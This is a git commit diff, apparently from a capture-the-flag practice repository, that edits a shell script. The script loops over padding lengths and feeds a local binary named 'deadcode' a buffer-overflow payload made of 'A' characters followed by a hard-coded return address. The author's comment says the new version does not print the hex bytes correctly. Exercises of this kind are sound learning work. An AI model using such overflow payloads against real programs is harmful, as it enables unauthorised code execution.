74279dc3a755116bf60c6eb8c2cd0d7024875e76
Kevin Thomas <kt1238@york.ac.uk>
2025-05-23 00:51:38 -0400

    working on deadcode

--- CTFChallenges/deadcode_challenge-EFLF40ER/buffer-injector.sh
+++ CTFChallenges/deadcode_challenge-EFLF40ER/buffer-injector.sh
@@ -2,5 +2,6 @@
 
 for i in {100..105};
 do
-./deadcode $(perl -e 'print "A" x 100 . "\x56\x9e\x04\x08"')
+# this bit is not printing hex chars correctly
+./deadcode $(perl -e "print 'A' x $i . '\x56\x9e\x04\x08'")
 done
